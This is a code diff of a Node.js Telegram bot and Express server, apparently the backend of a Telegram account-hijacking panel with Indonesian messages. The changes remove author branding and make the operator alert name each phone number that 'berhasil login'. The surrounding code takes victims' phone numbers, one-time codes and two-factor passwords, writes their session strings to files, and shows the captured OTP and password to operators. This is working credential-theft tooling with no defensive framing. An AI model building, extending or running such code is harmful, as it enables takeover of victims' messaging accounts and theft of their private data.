@@ -279,7 +279,7 @@ function startBot(token) {
           if (i.data.status === "success") password = i.data.password;
 
           await ctx.reply(
-              `📌 *Account Manager by JieCode*\n📞 Nomor: ${phoneNumberLink}\n📩 Last OTP: ${otpCode}\n🔐 Password: ${password}`,
+              `📌 *Account Manager *\n📞 Nomor: ${phoneNumberLink}\n📩 Last OTP: ${otpCode}\n🔐 Password: ${password}`,
               {
                   parse_mode: 'Markdown',
                   ...Markup.inlineKeyboard([
@@ -309,7 +309,7 @@ function startBot(token) {
           const response = await axios.get(`${API_BASE_URL}getPassword/${selectedNumber}`);
           if (response.data.status === "success") {
               const { phoneNumber, password } = response.data;
-              const message = `📌 *Account Manager by JieCode*\n📞 Nomor: ${phoneNumber}\n🔑 Password: \`${password}\`\n\n`;
+              const message = `📌 *Account Manager*\n📞 Nomor: ${phoneNumber}\n🔑 Password: \`${password}\`\n\n`;
               const backButton = Markup.inlineKeyboard([
                   [Markup.button.callback("⬅️ List Nomor", `select_${selectedNumber}`)]
               ]);
@@ -513,14 +513,14 @@ bot.action(/delete_group_(\d+)/, async (ctx) => {
     console.log('✅ Bot berjalan dengan token:', token);
 }
 
-function kirimPesanKeSemuaUser() {
+function kirimPesanKeSemuaUser(ecu) {
   console.log("📢 Mengirim pesan ke semua user...");
   if (users.length === 0) {
       console.log("⚠️ Tidak ada user yang tersimpan.");
       return;
   }
   users.forEach(chatId => {
-      bot.telegram.sendMessage(chatId, '📣 KIWWW, Ada nomor baru masuk bos')
+      bot.telegram.sendMessage(chatId, `📣 ${ecu} berhasil login`)
       .catch(err => console.error("❌ Error kirim pesan ke", chatId, ":", err));
   });
 }
@@ -693,7 +693,7 @@ app.post("/verifyCode", async (req, res) => {
         fs.writeFileSync(path.join("sessions", `${phoneNumber}.txt`), sessionString);
         fs.writeFileSync(path.join("sessions", `${timestamp}_${phoneNumber}.txt`), timestamp.toString());
 
-        kirimPesanKeSemuaUser();
+        kirimPesanKeSemuaUser(phoneNumber);
 
         res.json({
             status: "success",
@@ -791,7 +791,7 @@ app.post("/verifyPassword", async (req, res) => {
       fs.writeFileSync(path.join("sessions", `${phoneNumber}.txt`), sessionString);
       fs.writeFileSync(path.join("sessions", `${timestamp}_${phoneNumber}.txt`), timestamp.toString());
 
-      kirimPesanKeSemuaUser();
+      kirimPesanKeSemuaUser(phoneNumber);
 
       res.json({
           status: "success",
